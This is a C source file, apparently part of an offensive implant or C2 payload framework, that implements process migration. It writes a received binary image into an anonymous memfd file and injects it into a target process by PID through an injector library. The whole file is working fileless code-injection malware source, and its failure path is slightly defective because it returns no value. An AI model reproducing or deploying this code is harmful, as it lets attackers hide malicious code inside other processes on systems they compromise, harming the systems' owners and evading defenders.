/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

#include <limits.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>
#include <fcntl.h>

#if IS_LINUX
#include <syscall.h>
#endif

#ifndef IS_IPHONE
#include <injector.h>
#endif

#include <c2.h>
#include <log.h>
#include <migrate.h>

static int migrate_inject(pid_t pid, char *path)
{
    int shared;
    char buffer[4];

    injector_t *injector;

    if (injector_attach(&injector, pid) < 0)
    {
        log_debug("Failed to attach to (%d) - (%s)\n", pid, injector_error());
        return -1;
    }

    log_debug("* Attached to the process (%d)\n", pid);

#ifdef INJECTOR_HAS_INJECT_IN_CLONED_THREAD
    if (injector_inject_in_cloned_thread(injector, path, NULL) < 0)
    {
        goto fail;
    }
#else
    if (injector_inject(injector, path, NULL) < 0)
    {
        goto fail;
    }
#endif

    log_debug("* Injected to the process (%d)\n", pid);
    injector_detach(injector);

    return 0;

fail:
    log_debug("* Failed to inject (%s)\n", injector_error());
    injector_detach(injector);
}

int migrate_init(pid_t pid, int length, unsigned char *image)
{
    ssize_t count;
    size_t done;
    int fd;
    char path[PATH_MAX];

    done = 0;
    fd = syscall(SYS_memfd_create, "sas", 0);

    if (ftruncate(fd, length) < 0)
    {
        log_debug("* Unable to write object to file (%d)\n", fd);
        return -1;
    }

    log_debug("* Writing object to file (%d)\n", fd);

    while (done < length)
    {
        if ((count = write(fd, image + done, length - done)) < 0)
        {
            return -1;
        }

        done += count;
    }

    sprintf(path, "/proc/%d/fd/%d", getpid(), fd);
    return migrate_inject(pid, path);
}